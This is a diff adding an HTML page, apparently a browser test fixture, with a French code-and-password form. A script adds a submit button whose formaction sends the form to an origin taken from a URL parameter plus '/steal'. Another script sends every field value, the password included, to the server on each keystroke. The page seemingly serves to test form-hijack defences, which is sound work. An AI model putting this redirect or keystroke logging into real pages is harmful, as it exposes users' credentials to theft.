@@ -1,0 +1,21 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Vérification</title>
+<!-- The form's action is its own origin; with ?vers=<origin>, its submit button sends to <origin> instead. -->
+<form id="main" action="/fill/next.html">
+  <label for="code">Code de vérification</label><input id="code">
+  <label for="pin">Mot de passe</label><input type="password" id="pin">
+</form>
+<script>
+  const to = new URLSearchParams(location.search).get("vers");
+  if (to) {
+    const send = document.createElement("button");
+    send.textContent = "Valider";
+    send.setAttribute("formaction", to + "/steal");
+    document.getElementById("main").append(send);
+  }
+</script>
+<script>
+  // What the page sees in its fields, sent to its own server on each input: the test reads it there.
+  addEventListener("input", (e) => fetch("/log?" + new URLSearchParams({ f: e.target.id, v: e.target.value })));
+</script>
